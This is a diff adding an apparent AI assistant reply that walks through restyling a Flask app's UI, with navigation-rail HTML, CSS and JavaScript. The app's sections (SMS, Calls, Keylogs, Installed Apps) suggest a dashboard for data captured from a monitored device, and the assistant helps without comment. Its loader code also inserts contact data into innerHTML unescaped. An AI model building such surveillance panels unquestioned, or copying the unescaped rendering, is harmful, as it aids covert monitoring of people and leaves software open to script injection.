@@ -1,0 +1,273 @@
+Okay, I understand. You want me to help you refactor your existing Flask application (with `app.py`, `data.db`, and the HTML/CSS/JS files) to achieve a UI that closely resembles the one shown in the video you shared earlier, but using **your icons**, **your data**, and with these specific changes:
+
+*   **Navigation:**
+    *   Replicate the video's navigation rail style.
+    *   Use your custom icons.
+    *   Replace "Archived" with "Keylogs".
+    *   Replace "Marketplace" with "Contacts".
+*   **Content:**
+    *   Load data from your existing `data.db` database using your Flask API endpoints.
+    *   Maintain your application's features (Chat, SMS, Calls, Keylogs, Installed Apps, Contacts), but adapt the UI to match the video's aesthetic.
+
+**Here's a step-by-step plan to achieve this, along with code modifications:**
+
+**Step 1: Update the Navigation Rail (HTML Structure)**
+
+We'll modify your `base.html` to create a navigation rail similar to the one in the video. Since you want to use your custom icons, I'll assume you have image files for them.
+
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{% block title %}{% endblock %}</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='cyf8QhNEWE-MbVu6J6TSgCzupAm9R8u1G.css') }}">
+    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
+    <script src="{{ url_for('static', filename='script.js') }}" defer></script>
+</head>
+<body>
+    <div class="navigation-rail">
+        <div class="nav-content">
+            <nav>
+                <ul>
+                    <li data-section="chats" class="active">
+                        <img src="{{ url_for('static', filename='images/chat-icon.png') }}" alt="Chats Icon">
+                        <span>Chats</span>
+                    </li>
+                    <li data-section="calls">
+                        <img src="{{ url_for('static', filename='images/call-icon.png') }}" alt="Calls Icon">
+                        <span>Calls</span>
+                    </li>
+                    <li data-section="keylogs">
+                        <img src="{{ url_for('static', filename='images/keylogs-icon.png') }}" alt="Keylogs Icon">
+                        <span>Keylogs</span>
+                    </li>
+                    <li data-section="contacts">
+                        <img src="{{ url_for('static', filename='images/contacts-icon.png') }}" alt="Contacts Icon">
+                        <span>Contacts</span>
+                    </li>
+                </ul>
+            </nav>
+        </div>
+        <div class="profile-pic-container">
+            <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yL/r/J5WuQy7W1qj.png" alt="Profile Picture" class="profile-pic">
+        </div>
+    </div>
+
+    <div class="main-content">
+        {% block content %}
+        {% endblock %}
+    </div>
+
+    <script>
+        // Your existing JavaScript code (if any)
+    </script>
+</body>
+</html>
+```
+
+**Notes:**
+
+*   Replace `'images/chat-icon.png'`, `'images/call-icon.png'`, etc. with the actual paths to your icon image files within the `static` folder.
+*   I've added `<span>` tags for text labels next to the icons. You'll style these in CSS.
+*   I've kept the profile picture at the bottom, as that seems consistent with the video.
+
+**Step 2: Style the Navigation Rail (CSS)**
+
+Add the following CSS rules to your `styles.css` file to style the navigation rail like the one in the video:
+
+```css
+/* Navigation Rail */
+.navigation-rail {
+    background-color: var(--background-color);
+    width: 72px; /* Adjust width as needed */
+    padding: 10px 0;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    z-index: 1; /* Ensure navigation stays above content */
+    position: fixed; /* Sticky */
+    top: 0;
+    bottom: 0;
+    overflow-y: auto;
+}
+
+.nav-content {
+    flex-grow: 1; /* Allow navbar to fill height */
+}
+
+.navigation-rail ul {
+    list-style: none;
+    padding: 0;
+    margin: 0;
+}
+
+.navigation-rail li {
+    width: 56px; /* Adjust to fit your icons */
+    height: 56px;
+    border-radius: 50%; /* Circular shape */
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin-bottom: 12px;
+    cursor: pointer;
+}
+
+.navigation-rail li.active {
+    background-color: var(--surface-color); /* Highlight active item */
+}
+
+.navigation-rail li img {
+    width: 24px; /* Adjust to fit your icons */
+    height: 24px;
+}
+
+/* Navigation Rail Text Labels (Initially Hidden) */
+.navigation-rail li span {
+    display: none; /* Hide by default */
+    font-size: 12px;
+    margin-top: 4px; /* Space between icon and text */
+}
+
+/* Show Text Labels on Hover (or when expanded for a hamburger menu) */
+.navigation-rail li:hover span {
+    display: block;
+}
+
+/* Profile Picture at Bottom */
+.profile-pic-container {
+    margin-top: auto; /* Push to bottom */
+    padding: 10px;
+}
+
+.profile-pic {
+    width: 48px;
+    height: 48px;
+    border-radius: 50%;
+}
+
+/* Hide Other Main Content Sections By Default */
+.main-content > div:not(#chats) {
+    display: none;
+}
+```
+
+**Step 3: Update JavaScript for Navigation**
+
+Modify your `script.js` file to handle navigation clicks:
+
+```javascript
+document.addEventListener('DOMContentLoaded', () => {
+    const navItems = document.querySelectorAll('.navigation-rail li');
+    navItems.forEach(item => {
+        item.addEventListener('click', () => {
+            // Update active state
+            navItems.forEach(li => li.classList.remove('active'));
+            item.classList.add('active');
+
+            // Show corresponding section
+            const sectionId = item.getAttribute('data-section');
+            showSection(sectionId);
+        });
+    });
+});
+
+function showSection(sectionId) {
+    // Hide all sections first
+    document.querySelectorAll('.main-content > div').forEach(section => {
+        section.style.display = 'none';
+    });
+
+    // Show the selected section
+    const section = document.getElementById(sectionId);
+    if (section) {
+        section.style.display = 'block';
+    }
+}
+```
+
+**Step 4: Adapt Content Sections (HTML)**
+
+*   **`main_menu.html`:**
+    *   Keep the search bar and "Chats" title, but adjust the structure to be more like the video's contact list. You might use `<div>` elements with similar classes (`contact-card`, `profile-picture`, `contact-header`, etc.) instead of `<a>` tags, as in your `index.html`.
+    *   Remove the extra "Other Data" list.
+*   **`chat.html` and `sms.html`:**
+    *   Add the header with the back button, contact name, and potentially status (as in the video). Style it using CSS.
+*   **`calls.html`, `keylogs.html`, `contacts.html`:**
+    *   Ensure these sections have a consistent top bar with the section title.
+    *   Adapt the table styling (if needed) to match the video's aesthetic.
+
+**Step 5: Load Data with Your API (JavaScript)**
+
+You'll need to update your `script.js` to use your Flask API endpoints (`/`, `/chat/<name>`, `/sms/<name>`, `/calls`, `/keylogs`, `/contacts`) to fetch data and populate the content sections dynamically. You can use the `fetch` API as you had in your original `script.js`.
+
+**Example (update `script.js`):**
+
+```javascript
+// ... (your navigation code) ...
+
+async function loadContacts() {
+    try {
+        const response = await fetch('/'); // Your main route that fetches contacts
+        if (!response.ok) {
+            throw new Error('Failed to fetch contacts');
+        }
+        const data = await response.json();
+        const contacts = data.contacts
+
+        const contactList = document.querySelector('#conversation-list');
+        contactList.innerHTML = ''; // Clear existing list
+
+        contacts.forEach(contact => {
+            const contactItem = document.createElement('li');
+            contactItem.innerHTML = `
+                <a href="/chat/${contact.name}">
+                    <img src="${contact.avatar || 'https://via.placeholder.com/50'}" alt="Profile Picture" class="profile-pic-small">
+                    ${contact.name}
+                    <span class="message-snippet">
+                        ${contact.last_message ? `- ${contact.last_message}` : ''}
+                    </span>
+                </a>
+                <span class="timestamp">${contact.time || ''}</span>
+            `;
+            contactList.appendChild(contactItem);
+        });
+
+    } catch (error) {
+        console.error('Error loading contacts:', error);
+        // Display an error message in the UI
+    }
+}
+
+// ... (functions to load calls, keylogs, contacts, etc. using fetch) ...
+
+function showSection(sectionId) {
+    // ... (your existing code) ...
+
+    // Load data for the selected section
+    if (sectionId === 'chats') {
+        loadContacts();
+    } else if (sectionId === 'calls') {
+        loadCalls(); // Assuming you create a loadCalls() function
+    } else if (sectionId === 'keylogs') {
+        loadKeylogs();
+    } else if (sectionId === 'contacts') {
+        loadContactsData();
+    }
+}
+```
+
+**Step 6: Refine and Test:**
+
+*   **Test thoroughly:** Click through all the navigation items, test the search, and ensure data is loading correctly.
+*   **Adjust styling:** Fine-tune the CSS to match the video's look and feel as closely as possible. Pay attention to colors, spacing, fonts, and icon sizes.
+*   **Mobile responsiveness:** Test on different screen sizes to ensure the layout adapts correctly.
+
+**Remember:**
+
+*   Replace placeholder image paths with your actual image paths.
+*   Update API endpoints in `script.js` if they are different in your Flask app.
+*   Adapt the data loading logic in `script.js` to match the structure of the data returned by your API.
+
+This detailed plan should give you a solid foundation to refactor your Messenger UI to match the video while using your existing backend and data. Feel free to ask if you have more questions!
